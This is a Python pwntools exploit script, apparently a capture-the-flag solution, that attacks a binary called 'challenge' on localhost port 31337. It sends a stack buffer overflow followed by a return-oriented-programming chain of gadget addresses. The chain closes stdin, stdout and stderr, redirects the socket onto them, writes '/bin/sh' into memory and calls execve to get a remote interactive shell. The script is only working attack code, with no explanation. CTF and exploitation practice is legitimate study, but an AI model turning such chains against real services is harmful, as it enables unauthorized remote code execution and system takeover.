from pwn import *

p = remote("127.0.0.1", 31337)
elf = ELF('challenge')

p.sendline("500")
payload = 'A' * 152

POP_RAX_RET = 0x4009d2
POP_RDI_RET = 0x400ba3
POP_RBP_RET = 0x400840
POP_RSI_RET = 0x400ba1
SYSCALL = 0x4009d4
MOV_DWORD = 0x4009cf  # mov dword ptr [rbp - 8], eax; pop rax; ret

# close(0); close(1); close(2)
payload += p64(POP_RDI_RET) + p64(0)
payload += p64(POP_RAX_RET) + p64(3)
payload += p64(SYSCALL)
payload += p64(POP_RDI_RET) + p64(1)
payload += p64(POP_RAX_RET) + p64(3)
payload += p64(SYSCALL)
payload += p64(POP_RDI_RET) + p64(2)
payload += p64(POP_RAX_RET) + p64(3)
payload += p64(SYSCALL)

# dup fd
payload += p64(POP_RDI_RET) + p64(4)
payload += p64(POP_RAX_RET) + p64(32)
payload += p64(SYSCALL)
payload += p64(POP_RDI_RET) + p64(4)
payload += p64(POP_RAX_RET) + p64(32)
payload += p64(SYSCALL)

# execve("/bin/sh", 0, 0)
payload += p64(POP_RBP_RET) + p64(0x601508)
payload += p64(POP_RAX_RET) + "/bin\x00\x00\x00\x00"  # pop rax; ret
payload += p64(MOV_DWORD) + "/sh\x00\x00\x00\x00\x00"
payload += p64(POP_RBP_RET) + p64(0x60150c)
payload += p64(MOV_DWORD) + p64(0)
payload += p64(POP_RDI_RET) + p64(0x601500)
payload += p64(POP_RSI_RET) + p64(0) + p64(0)
payload += p64(POP_RAX_RET) + p64(0x3b)
payload += p64(SYSCALL)

p.sendline(payload)

p.interactive()
